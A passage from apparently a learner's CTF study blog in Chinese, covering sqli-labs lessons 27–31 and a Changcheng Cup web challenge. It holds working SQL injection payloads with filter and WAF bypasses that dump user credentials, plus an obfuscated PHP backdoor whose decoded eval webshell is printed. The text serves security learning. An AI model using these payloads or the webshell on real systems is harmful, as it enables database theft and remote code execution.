class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,3;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(table_name)%0Afrom%0AinfoRmation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(column_name)%0Afrom%0AinfoRmation_schema.columns%0Awhere%0Atable_name=&#x27;users&#x27;%0Aand%0Atable_schema=&#x27;security&#x27;;%00<br>?id=0&#x27;%0AunIOn%0ASeleCT%0A1,2,group_concat(id,username,passwOrd )%0Afrom%0Ausers;%00<br></code></pre></td></tr></table></figure><h1 id="less27a"><a href="#less27a" class="headerlink" title="less27a"></a>less27a</h1><p>依旧没用过滤大小写，区别是没用报错回显，不能用报错注入。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,2,3;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(table_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.tables%0Awhere<span class="hljs-variable">%0Atable_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;<span class="hljs-variable">%00</span><br>?id=<span class="hljs-number">11111</span><span class="hljs-string">&quot;uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(column_name)from<span class="hljs-variable">%0AinfoRmation_schema</span>.columns%0Awhere<span class="hljs-variable">%0Atable_name</span>=&#x27;users&#x27;%0Aand<span class="hljs-variable">%0Atable_schema</span>=&#x27;security&#x27;;<span class="hljs-variable">%00</span></span><br><span class="hljs-string">?id=11111&quot;</span>uNion%0AselecT<span class="hljs-variable">%0A1</span>,database(),group_concat(id,username,password)from<span class="hljs-variable">%0Ausers</span>;<span class="hljs-variable">%00</span><br></code></pre></td></tr></table></figure><hr><h2 id="title-note-14date-2025-03-16-00-48-04tags-sql-labs"><a href="#title-note-14date-2025-03-16-00-48-04tags-sql-labs" class="headerlink" title="title: note-14date: 2025-03-16 00:48:04tags: sql-labs"></a>title: note-14<br>date: 2025-03-16 00:48:04<br>tags: sql-labs</h2><h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>测试出闭合点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=1&#x27;);%00<br></code></pre></td></tr></table></figure><p>然后看一眼源码的过滤  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[\/\*]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//strip out /*</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[--]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out --.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[#]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//Strip out #.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[ +]/&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out UNION &amp; SELECT.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><p>这辉大小写绕过就没用了，<br>而且好像是这两同时出现成union select 时才会触发过滤<br>这样的话双写绕过就有点难吧<br>但是明白了原理，根据过滤机制进行绕过就ok  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs s">?id=0&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,2,3;%00<br></code></pre></td></tr></table></figure><p>有点奇葩，但确实能用<br>也可以选择报错注入好像(不行，没有报错)，不试了  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="hljs-string">&#x27;;%00</span><br><span class="hljs-string">?id=0&#x27;</span>)<span class="hljs-operator">%</span><span class="hljs-number">0</span>Auunion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselectnion<span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselect<span class="hljs-operator">%</span><span class="hljs-number">0</span>A1,database(),group_concat(column_name)<span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Ainformation_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">0</span>Awhere<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Aand<span class="hljs-operator">%</span><span class="hljs-number">0</span>Atable_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%0Auunion%0Aselectnion%0Aselect%0A1,database(),group_concat(id,username,password)from%0Asecurity.users;%00</span><br></code></pre></td></tr></table></figure><h1 id="less28a"><a href="#less28a" class="headerlink" title="less28a"></a>less28a</h1><p>看一眼源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);//strip out /*</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span><br><span class="hljs-variable">$id</span>= <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/union\s+select/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    <span class="hljs-comment">//Strip out spaces.</span><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;<br></code></pre></td></tr></table></figure><p>好像只对union select 进行了过滤</p><p>payload</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">0</span>&#x27;)ununion selection <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>比上关更简单，只过了union select，其它都没过滤  </p><h1 id="less29-waf过滤"><a href="#less29-waf过滤" class="headerlink" title="less29 waf过滤"></a>less29 waf过滤</h1><blockquote><p>从29到31关，要用到启动tomcat作为过滤服务器，确定参数安全后才交给apache服务器。只需将sqli-labs文件夹下的tomcat-files.zip解压到tomcat&#x2F;webapp&#x2F;ROOT目录下，启动tomcat&#x2F;bin下的startup.bat即可(关闭为shutdown.bat)。<br>by<br><a href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/kukudeshuo/article/details/114763700">https://blog.csdn.net/kukudeshuo/article/details/114763700</a></p></blockquote><p>我没有跟博客去配置tomcat，但是直接用login.php来进行测试<br>好像就是同样效果，那我直接当它配置好了吧  </p><p>那就是输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/sqli-labs/Less-29/login.php?id=1   //回显正常<br>/sqli-labs/Less-29/login.php?id=1&#x27;  //会转到hacked.php<br></code></pre></td></tr></table></figure><p>那大概就是waf成功阻止了此次注入<br>那就要想办法绕过waf了  </p><blockquote><p>由于tomcat和apache解析参数的顺序不同，当注入两个参数?id&#x3D;1&amp;id&#x3D;2，此时tomcat解析的是第一个参数，而apache解析的是第二个参数并且SQL语句也是在apache服务器上执行的，由此绕过tomcat的检测。<br>by<br><a href="https://blog.csdn.net/2301_76913435/article/details/145601627">https://blog.csdn.net/2301_76913435/article/details/145601627</a></p></blockquote><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>login.php<span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>&#x27;<span class="hljs-operator">--+</span><br><span class="hljs-comment">//回显</span><br><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>的内容<br></code></pre></td></tr></table></figure><p>直接构造</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/sqli-labs/Less<span class="hljs-number">-29</span>/login.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>&#x27; union select <span class="hljs-number">1</span>,database(),group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> security.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>成功</p><h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>Web应用程序防火墙（Web Application Firewall，WAF）是一种用于保护Web应用程序的安全设备。Web应用程序是指通过Web浏览器或其他Web客户端访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。</p><h1 id="less30"><a href="#less30" class="headerlink" title="less30"></a>less30</h1><p>和上一关一样有waf，但好像没有id的话就不会有回显</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-30</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">3</span>&amp;id=<span class="hljs-number">0</span>&quot;union select 1,2,3--+<br><br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>看了源码还差点找不到注入点😥….</p><h1 id="less31"><a href="#less31" class="headerlink" title="less31"></a>less31</h1><p>waf<br>闭合点</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli-labs/Less<span class="hljs-number">-31</span>/<span class="hljs-keyword">login</span>.php/?id=<span class="hljs-number">1</span>&amp;id=<span class="hljs-number">0</span>&quot;) union select 1,2,3--+<br>/sqli-labs/Less-30/login.php/?id=3&amp;id=0&quot;)<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>按原计划，sql-labs的学习就先到这，下面sql注入的学习该去做ctf真题了，不得不说sqli-labs的帮助真挺大，能打好sql注入的原理和基础</p><hr><h2 id="title-note-15date-2025-03-20-19-43-49tags-review"><a href="#title-note-15date-2025-03-20-19-43-49tags-review" class="headerlink" title="title: note-15date: 2025-03-20 19:43:49tags: review"></a>title: note-15<br>date: 2025-03-20 19:43:49<br>tags: review</h2><h1 id="2024下半年长城杯回顾"><a href="#2024下半年长城杯回顾" class="headerlink" title="2024下半年长城杯回顾"></a>2024下半年长城杯回顾</h1><p>在机房上从新回顾3个月前的长城杯web题wp，发现已经能看懂不少了  </p><h2 id="追忆1-hello-web"><a href="#追忆1-hello-web" class="headerlink" title="追忆1 hello_web"></a>追忆1 hello_web</h2><p>还记得当初做这题就是在那干瞪眼，用dirsearch和查看前端认出了个hackme.php。<br>已经没有题目环境了，干看大佬的wp<br><a href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p><p>那大概就是双写..&#x2F;进行绕过来目录穿越访问到tips和hackme<br><strong>(主要是要学一下面对未知环境时该怎么办，现在还没有一套渗透流程，起手fuzz都fuzz不明白)</strong>   </p><p>然后能在tips看到phpinfo和过滤内容<br>然后是hackme.php  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$YwzIst</span>(<span class="hljs-string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到大佬们说给反混淆一下就行了，我搞了两节课大约一个半小时才搞明白😫…..<br>步骤就是先按php的分号给分明白代码行，然后尝试用厨子解码里面看不懂的东西</p><p>这是我搞的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<br><span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<br><span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-comment">//eval($YwzIst(&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;));</span><br><span class="hljs-variable">$uWcdaA</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox==&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$YwzIst</span>(<span class="hljs-variable">$OxirhK</span>(<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-variable">$rVkKjU</span>,<span class="hljs-variable">$rVkKjU</span>),<span class="hljs-variable">$YpAUWC</span>(<span class="hljs-variable">$uWcdaA</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$rVkKjU</span>))));<br></code></pre></td></tr></table></figure><p>其中一些变量扔厨子也煮不出来，看佬们wp也是不动它们，<br>重要是不知道要echo的东西大佬们是怎么知道的，又去找一大堆wp，好像都是默认知道要echo啥一样，最后自己仔细看了一遍发现就是把base解码出来的eval里的内容echo出来😫。。。   </p><p><strong>即使蠢如猪豚我也要在ctf走下去口牙！我就是这样的哈基尸啊</strong>  </p><p>最后运行结果好像输出一大串css还是html的东西，但是最后有一句话木马，get到密码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/code&gt;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd_66.99&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后是连木马，但是注意要用蚁剑的UserFilter插件，这个是针对php7版本的绕过插件<br><a href="https://hcnote.cn/2024/12/25/12056.html">https://hcnote.cn/2024/12/25/12056.html</a><br>也可以用其它插件来绕过disable_fuction<br><a href="https://www.cnblogs.com/DumpInfou/p/18023278">https://www.cnblogs.com/DumpInfou/p/18023278</a><br><a href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p><p>linux下搜索flag字符</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span> -<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>&gt;/dev/null<br><br>grep -rvh ‘<span class="hljs-built_in">flag</span>’<br></code></pre></td></tr></table></figure><hr><h2 id="title-note-16date-2025-03-22-22-39-23tags-unserialize"><a href="#title-note-16date-2025-03-22-22-39-23tags-unserialize" class="headerlink" title="title: note-16date: 2025-03-22 22:39:23tags: unserialize"></a>title: note-16<br>date: 2025-03-22 22:39:23<br>tags: unserialize</h2><h1 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span 